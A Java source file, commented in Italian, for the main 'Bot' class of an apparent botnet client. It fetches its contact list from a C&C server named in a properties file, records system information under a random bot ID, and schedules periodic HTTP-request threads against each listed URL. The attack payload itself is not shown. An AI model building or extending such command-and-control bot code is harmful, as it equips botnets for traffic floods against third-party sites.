package control.client;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Properties;
import java.util.Timer;
import control.Config;
import control.Utility;
import control.server.ProgramLog;
import model.BotStatus;
import model.SortMode;
import model.SystemInfoEntry;
import model.URLEntry;
import model.gui.URLEntryProperty;

/**
 * La classe Bot è la classe principale del bot. Il suo compito è quello di 
 * leggere o richiedere al server C&C il file di configurazione e di avviare i thread 
 * che poi effettueranno le richieste HTTP
 *
 */
public class Bot {
	
	String botId;
	BotStatus status;
	Timer timer;
	Config config;
	Log log;
	ProgramLog programLog;
	SystemInfoBot systemInfoBot;
	ArrayList<ContactThread> contactThreadList;
	Path prjDirPath, dataDirPath, configFilePath, logFilePath, sysInfoFilePath, propertiesFilePath, botDirPath;		
	SocketBotThread socketBotThread;
	Properties properties;
	
	public Bot() {
		botId = Utility.generateID(SortMode.RANDOM);
		status = BotStatus.IDLE;
	}
	
	public String getBotId() {
		return botId;
	}
	
	public Config getConfig() {
		return config;
	}
	
	public String getId() {
		return botId;
	}
	
	public void setId(String id) {
		this.botId = id;
	}
	
	public BotStatus getStatus() {
		return status;
	}
	
	public void setStatus(BotStatus status) {
		this.status = status;
	}
	
	public ArrayList<URLEntry> getContactsList() {
		return config.getContactsList();
	}
	
	/**
	 * Set contact list and save configuration file
	 * */
	public void setContactsList(ArrayList<URLEntry> contactsList) {
		config.setContactsList(contactsList);
		config.writeFile();
	}

	public ArrayList<SystemInfoEntry> getSystemInfoEntryList() {
		return systemInfoBot.getSystemInfoEntryList();
	}
	
	/**
	 * Inizializzazione del Bot
	 */
	public void init() {

		initPaths();

		properties = readPropertyFile(propertiesFilePath);
		config = new Config(configFilePath);
		log = new Log(logFilePath);
		programLog = ProgramLog.getProgramLog();
		systemInfoBot = new SystemInfoBot(sysInfoFilePath);
		
		config.openOrCreateConfigFile();
		config.readFile();
			
		log.openOrCreateLogFile();
		programLog.addInfo("Program Started");

		systemInfoBot.overwriteSystemInfoFile();
		systemInfoBot.writeSystemInfoFile(botId);

		/*Se il file di configurazione è scaduto oppure è vuoto 
		 * il bot richiede un nuovo file di configurazione al server*/
		if(config.getContactsList().size()==0 || config.getConfigHeader().getTtl().intValue() == 0){
			socketBotThread = new SocketBotThread(properties.getProperty("serverAddress"));
			socketBotThread.start();
			synchronized (socketBotThread) {
				try {
					socketBotThread.wait();
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}
		
		if(config.getConfigHeader().decreaseTtl()){
			config.writeFile();
		}
	}

	/**
	 * Inizializzazione dei percorsi
	 */
	private void initPaths() {
		prjDirPath = Paths.get(System.getProperty("user.dir"));
		dataDirPath = prjDirPath.resolve("data");
		botDirPath = dataDirPath.resolve("bot");
		configFilePath = botDirPath.resolve("config.txt");
		logFilePath = botDirPath.resolve("log.txt");
		sysInfoFilePath = botDirPath.resolve("sysinfo.txt");
		propertiesFilePath = botDirPath.resolve("byobv1.properties");		
	}


	/**
	 * Lettura del file di configurazione byobv1.properties contenente 
	 * parametri necessari per il funzionamento del programma come ad esempio
	 * l'indirizzo del serverC&C
	 * 
	 * @param propertiesFilePath percorso del file di configurazione interno
	 */
	private Properties readPropertyFile(Path propertiesFilePath) {		
		Properties returnValue;
		returnValue = new Properties();
		InputStream inputStream = null;
		try {
			inputStream = new FileInputStream(propertiesFilePath.toString());
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		}
		
		try {
			returnValue.load(inputStream);
		} catch (IOException e) {
			e.printStackTrace();
		} catch (NullPointerException e) {
			e.printStackTrace();
		}
		
		return returnValue;
	}

	/**
	 * Il metodo close() si occupa di scrivere il file di configurazione
	 * e di cancellare l'esecuzione dei thread periodici
	 */
	public void close() {
		config.writeFile();

		try {
			timer.cancel();	
		} catch (NullPointerException e) {
			
		}
	}

	/**
	 * Il metodo crea un thread periodico per ogni URL presente nel file di configurazione
	 */
	public void start() {
		contactThreadList = new ArrayList<ContactThread>();
		timer = new Timer();
		
		for (int i = 0; i < config.getContactsList().size(); i++) {
			ContactThread cThread = new ContactThread(config.getContactsList().get(i), timer);
			contactThreadList.add(cThread);
			timer.schedule(cThread, 0);
		}
	}
	
	/**
	 * Interruzione dell'invio delle richieste.
	 * Non usato
	 */
	public void stop() {
		timer.cancel();
		for (int i = 0; i < contactThreadList.size(); i++) {
			contactThreadList.get(i).setContactNumber(0);
		}
	}
	
	public ArrayList<URLEntryProperty> getContactsListProperty() {
		ArrayList<URLEntryProperty> returnValue = new ArrayList<URLEntryProperty>();
		
		for (int i = 0; i < config.getContactsList().size(); i++) {
			returnValue.add(new URLEntryProperty(config.getContactsList().get(i)));
		}

		return returnValue;
	}

	public URLEntry addContact(URLEntry newUrlEntry) {
		int lastContactId = 0;
		if(!config.getContactsList().isEmpty()){
			lastContactId = config.getContactsList().get(config.getContactsList().size()-1).getID();
		}
		newUrlEntry.setID(lastContactId+1);
		config.getContactsList().add(newUrlEntry);
		return newUrlEntry;
	}

	public void removeContact(Integer id) {
		for (int i = 0; i < config.getContactsList().size(); i++) {
			if(config.getContactsList().get(i).getID().equals(id)){
				config.getContactsList().remove(i);
			}
		}
	}

	public void editContact(URLEntry newUrlEntry) {
		int i;
		for (i = 0; i < config.getContactsList().size(); i++) {
			if(config.getContactsList().get(i).getID()==newUrlEntry.getID()){
				break;
			}
		}
		config.getContactsList().set(i, newUrlEntry);
	}
}
